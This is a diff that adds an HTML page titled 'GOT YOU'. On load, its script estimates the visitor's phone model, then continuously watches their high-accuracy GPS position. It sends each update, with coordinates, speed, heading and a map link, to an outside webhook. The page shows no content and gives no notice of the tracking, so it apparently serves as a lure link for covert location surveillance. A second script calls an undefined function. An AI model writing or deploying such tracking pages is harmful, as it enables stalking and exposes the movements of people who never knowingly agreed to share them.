@@ -1,0 +1,567 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+	<title>GOT YOU</title>
+<script>
+
+"use strict";
+
+/* =========================================================
+   CONFIGURATION
+   ========================================================= */
+
+const WEBHOOK_URL =
+    "https://app.hooklistener.com/w/startran-endpoint-yry";
+
+
+/* =========================================================
+   GLOBALS
+   ========================================================= */
+
+let locationWatchId = null;
+
+let deviceModel = "Unknown";
+
+
+/* =========================================================
+   GET PHONE MODEL
+   ========================================================= */
+
+async function getPhoneModel() {
+
+    const ua =
+        navigator.userAgent || "";
+
+    /*
+        Android
+        --------
+        Android User-Agent strings commonly contain
+        the hardware model.
+    */
+
+    if (/Android/i.test(ua)) {
+
+        const match =
+            ua.match(
+                /Android[^;]*;\s*(?:[a-zA-Z]{2}-[a-zA-Z]{2};\s*)?([^;)]+)(?:\)|;)/i
+            );
+
+        if (match) {
+
+            const model =
+                match[1].trim();
+
+            if (
+                model &&
+                model.length < 100
+            ) {
+
+                return model;
+            }
+        }
+
+        /*
+            Try User-Agent Client Hints if available.
+        */
+
+        if (
+            navigator.userAgentData &&
+            navigator.userAgentData.getHighEntropyValues
+        ) {
+
+            try {
+
+                const hints =
+                    await navigator.userAgentData
+                        .getHighEntropyValues(
+                            [
+                                "model"
+                            ]
+                        );
+
+                if (hints.model) {
+
+                    return hints.model;
+                }
+
+            }
+
+            catch (error) {
+
+                console.log(
+                    "Android model client hints unavailable."
+                );
+            }
+        }
+
+        return "Android Device";
+    }
+
+
+    /* =====================================================
+       IPHONE
+       ===================================================== */
+
+    if (/iPhone/i.test(ua)) {
+
+        /*
+            Apple intentionally hides the exact iPhone
+            model from normal browser JavaScript.
+
+            We can estimate the model family from the
+            physical screen dimensions exposed by Safari.
+        */
+
+        const width =
+            Math.min(
+                screen.width,
+                screen.height
+            );
+
+        const height =
+            Math.max(
+                screen.width,
+                screen.height
+            );
+
+        const dpr =
+            window.devicePixelRatio || 1;
+
+
+        if (
+            width === 320 &&
+            height === 568
+        ) {
+
+            return "iPhone 5 / 5s / SE (1st generation)";
+        }
+
+
+        if (
+            width === 320 &&
+            height === 480
+        ) {
+
+            return "iPhone 4 / 4S";
+        }
+
+
+        if (
+            width === 375 &&
+            height === 667
+        ) {
+
+            return "iPhone SE / 6 / 6s / 7 / 8 family";
+        }
+
+
+        if (
+            width === 414 &&
+            height === 736
+        ) {
+
+            return "iPhone 6 Plus / 6s Plus / 7 Plus / 8 Plus family";
+        }
+
+
+        if (
+            width === 375 &&
+            height === 812
+        ) {
+
+            return "iPhone X / XS / 11 Pro / 12 mini / 13 mini family";
+        }
+
+
+        if (
+            width === 390 &&
+            height === 844
+        ) {
+
+            return "iPhone 12 / 13 / 13 Pro / 14 family";
+        }
+
+
+        if (
+            width === 393 &&
+            height === 852 &&
+            dpr === 3
+        ) {
+
+            return "iPhone 15 / 15 Pro family";
+        }
+
+
+        if (
+            width === 402 &&
+            height === 874 &&
+            dpr === 3
+        ) {
+
+            return "iPhone 16 / 16 Pro family";
+        }
+
+
+        if (
+            width === 428 &&
+            height === 926
+        ) {
+
+            return "iPhone 12 Pro Max / 13 Pro Max / 14 Plus family";
+        }
+
+
+        if (
+            width === 430 &&
+            height === 932 &&
+            dpr === 3
+        ) {
+
+            return "iPhone 14 Pro Max / 15 Plus / 15 Pro Max family";
+        }
+
+
+        if (
+            width === 440 &&
+            height === 956 &&
+            dpr === 3
+        ) {
+
+            return "iPhone 16 Pro Max";
+        }
+
+
+        return "iPhone";
+    }
+
+
+    /* =====================================================
+       IPAD
+       ===================================================== */
+
+    if (/iPad/i.test(ua)) {
+
+        return "iPad";
+    }
+
+
+    /* =====================================================
+       OTHER
+       ===================================================== */
+
+    return "Unknown";
+}
+
+
+/* =========================================================
+   SEND LOCATION TO WEBHOOK
+   ========================================================= */
+
+async function sendLocation(position) {
+
+    const latitude =
+        position.coords.latitude;
+
+    const longitude =
+        position.coords.longitude;
+
+
+    const payload = {
+
+        /*
+            Phone model
+        */
+
+        model:
+            deviceModel,
+
+
+        /*
+            Coordinates
+        */
+
+        latitude:
+            latitude,
+
+        longitude:
+            longitude,
+
+        accuracy:
+            position.coords.accuracy,
+
+
+        /*
+            Optional GPS information
+        */
+
+        altitude:
+            position.coords.altitude,
+
+        heading:
+            position.coords.heading,
+
+        speed:
+            position.coords.speed,
+
+
+        /*
+            Current browser/device time
+        */
+
+        time:
+            new Date().toISOString(),
+
+
+        /*
+            Time supplied by the GPS position
+        */
+
+        locationTime:
+            position.timestamp
+                ? new Date(
+                    position.timestamp
+                ).toISOString()
+                : null,
+
+
+        /*
+            Google Maps link
+        */
+
+        map:
+            `https://www.google.com/maps?q=${latitude},${longitude}`
+    };
+
+
+    console.log(
+        "Sending location:",
+        payload
+    );
+
+
+    try {
+
+        await fetch(
+    WEBHOOK_URL,
+    {
+        method: "POST",
+
+        headers: {
+            "Content-Type":
+                "text/plain;charset=UTF-8"
+        },
+
+        body:
+            JSON.stringify(payload),
+
+        mode: "no-cors",
+
+        keepalive: true
+    }
+);
+        console.log(
+            "Location sent successfully."
+        );
+
+    }
+
+    catch (error) {
+
+        console.error(
+            "Webhook error:",
+            error
+        );
+    }
+}
+
+
+/* =========================================================
+   START LOCATION TRACKING
+   ========================================================= */
+
+function startTracking() {
+
+    if (!navigator.geolocation) {
+
+        console.error(
+            "This browser does not support geolocation."
+        );
+
+        return;
+    }
+
+
+    /*
+        Prevent multiple watchers.
+    */
+
+    if (locationWatchId !== null) {
+
+        return;
+    }
+
+
+    console.log(
+        "Starting location tracking..."
+    );
+
+
+    locationWatchId =
+        navigator.geolocation.watchPosition(
+
+            /*
+                LOCATION UPDATE
+            */
+
+            function(position) {
+
+                console.log(
+                    "Location update:",
+                    position.coords
+                );
+
+
+                sendLocation(
+                    position
+                );
+            },
+
+
+            /*
+                ERROR
+            */
+
+            function(error) {
+
+                console.error(
+                    "Location error:",
+                    error
+                );
+
+
+                switch (error.code) {
+
+                    case error.PERMISSION_DENIED:
+
+                        console.error(
+                            "Location permission denied."
+                        );
+
+                        break;
+
+
+                    case error.POSITION_UNAVAILABLE:
+
+                        console.error(
+                            "Location unavailable."
+                        );
+
+                        break;
+
+
+                    case error.TIMEOUT:
+
+                        console.error(
+                            "Location request timed out."
+                        );
+
+                        break;
+                }
+            },
+
+
+            /*
+                OPTIONS
+            */
+
+            {
+                enableHighAccuracy:
+                    true,
+
+                maximumAge:
+                    0,
+
+                timeout:
+                    15000
+            }
+        );
+
+
+    console.log(
+        "Location watcher started:",
+        locationWatchId
+    );
+}
+
+
+/* =========================================================
+   INITIALIZE
+   ========================================================= */
+
+async function initialize() {
+
+    console.log(
+        "Tracking page loaded."
+    );
+
+
+    /*
+        Determine the phone model before starting
+        location tracking.
+    */
+
+    deviceModel =
+        await getPhoneModel();
+
+
+    console.log(
+        "Detected device:",
+        deviceModel
+    );
+
+
+    /*
+        Start location tracking.
+
+        The browser will display the location permission
+        prompt automatically if permission hasn't already
+        been granted.
+    */
+
+    startTracking();
+}
+
+
+/* =========================================================
+   PAGE LOAD
+   ========================================================= */
+
+if (
+    document.readyState ===
+    "loading"
+) {
+
+    document.addEventListener(
+        "DOMContentLoaded",
+        initialize
+    );
+
+}
+
+else {
+
+    initialize();
+}
+
+</script>
+<head>
+<body>
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+
+    StartLocationTracking();
+
+});
+</script>
+</body>
+</html>
